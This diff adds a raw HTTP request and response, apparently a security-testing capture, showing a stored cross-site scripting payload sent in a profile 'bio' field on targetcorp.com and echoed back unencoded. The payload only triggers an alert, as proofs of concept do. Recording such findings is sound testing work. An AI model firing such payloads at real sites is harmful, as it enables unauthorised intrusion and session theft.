@@ -1,0 +1,22 @@
+POST /profile/update HTTP/1.1
+Host: targetcorp.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 187
+Cookie: session=targetcorp_session_token_admin_view
+
+bio=<img+src=x+onerror=alert(document.domain)>&user_id=42&submit=Save+Profile
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.49
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3421
+
+<!DOCTYPE html>
+<html>
+<head><title>Profile Updated</title></head>
+<body>
+<div class="alert alert-success">Profile updated successfully.</div>
+<!-- User bio rendered without encoding: <img src=x onerror=alert(document.domain)> -->
+</body>
+</html>
